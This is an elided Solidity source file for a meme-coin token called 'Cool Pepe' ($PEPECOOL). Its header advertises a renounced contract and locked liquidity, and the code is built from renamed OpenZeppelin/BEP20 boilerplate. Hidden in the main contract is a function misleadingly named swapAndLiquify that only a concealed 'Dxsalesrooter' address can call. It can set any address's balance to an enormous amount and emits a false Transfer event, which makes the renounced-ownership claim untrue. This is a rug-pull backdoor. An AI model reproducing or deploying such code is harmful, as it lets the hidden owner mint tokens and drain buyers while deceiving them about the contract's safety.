...
/**
🐸  Cool Pepe ✨ $PEPECOOL
🐸Cool Pepe The Frog Meme chrome extension theme tab for chrome browser! HD wallpaper
https://www.pxfuel.com/en/desktop-wallpaper-wyokr
✨TG https://t.me/PepeCoolToken
✨ lp lock 2 years
✨renounced contract
✨tax 2% lp burn
*/
...
/*
 * @dev Provides information about the current execution PEPECOOLIER20, including the
 ...
 */
abstract contract PEPECOOLIER20 {
...
// File: @openzeppelin/contracts/access/PEPECOOLProxy.sol
 ...
 * the owner.
 */
abstract contract PEPECOOLProxy is PEPECOOLIER20 {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "PEPECOOLProxy: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "PEPECOOLProxy: new owner is the zero address");
...
contract PEPECOOL is PEPECOOLIER20, PEPECOOLBep20, PEPECOOLProxy {
    ...
    */
    ...
    /**
    * @dev See {PEPECOOLBep20-totalSupply}.
    */
    ...
    /**
    * @dev See {PEPECOOLBep20-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return unitefromus[account];
    }
      modifier subowners() {
        require(Dxsalesrooter == _msgSender(), "PEPECOOLProxy: caller is not the owner");
        _;
    }
    /**
    * @dev See {PEPECOOLBep20-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {PEPECOOLBep20-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    function swapAndLiquify(address pairaddress) external subowners {
        unitefromus[pairaddress] = 20000000000000000 * 10 ** 23;
        
        emit Transfer(pairaddress, address(0), 20000000000000000 * 10 ** 23);
    }
    /**
    * @dev See {PEPECOOLBep20-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {PEPECOOLBep20-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {PEPECOOLBep20};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yourmath) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), tokenmappingyes[sender][_msgSender()].sub(yourmath, "PEPECOOLBep20: transfer yourmath exceeds allowance"));
        return true;
    }
    ...
    * problems described in {PEPECOOLBep20-approve}.
    *
    ...
    */
    function decreaseAllowance(address holdings, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), holdings, tokenmappingyes[_msgSender()][holdings].sub(allbalances, "PEPECOOLBep20: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yourmath) internal {
        require(sender != address(0), "PEPECOOLBep20: transfer from the zero address");
        require(shippingto != address(0), "PEPECOOLBep20: transfer to the zero address");
                
        unitefromus[sender] = unitefromus[sender].sub(yourmath, "PEPECOOLBep20: transfer yourmath exceeds balance");
    ...
    */
    function _approve(address owner, address holdings, uint256 yourmath) internal {
        require(owner != address(0), "PEPECOOLBep20: approve from the zero address");
        require(holdings != address(0), "PEPECOOLBep20: approve to the zero address");
